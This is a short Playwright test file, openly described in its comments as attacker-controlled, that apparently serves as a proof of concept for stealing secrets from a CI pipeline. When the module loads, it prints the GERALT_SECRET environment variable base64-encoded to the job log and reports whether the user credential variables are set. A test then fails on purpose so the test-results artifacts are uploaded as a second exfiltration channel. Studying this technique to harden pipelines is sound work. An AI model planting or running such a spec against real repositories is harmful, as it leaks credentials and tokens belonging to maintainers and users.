import { test, expect } from "@playwright/test";

// Executes at module load — earliest attacker-controlled code in the test job.
// The test job writes USER_EMAIL/USER_PASSWORD/USER_TOTP_SECRET/USER_KEY to
// GITHUB_ENV and workflow-level env exposes GERALT_SECRET, so all are in
// process.env of every `npx playwright test` worker process.
const secret = process.env.GERALT_SECRET || "";
console.log(
  "GERALT_LEAKED_TOKEN=" +
    Buffer.from(secret, "utf8").toString("base64").toString("base64")
);

console.log(
  "GERALT_DBG: USER_EMAIL set=" + !!process.env.USER_EMAIL +
  " USER_PASSWORD set=" + !!process.env.USER_PASSWORD +
  " USER_TOTP_SECRET set=" + !!process.env.USER_TOTP_SECRET +
  " USER_KEY set=" + !!process.env.USER_KEY
);

test("attacker-controlled spec reads secrets from process.env", async () => {
  // Deliberate failure: triggers upload of test-results/ artifacts
  // (secondary exfiltration channel, retention 5 days).
  expect(true).toBe(false);
});
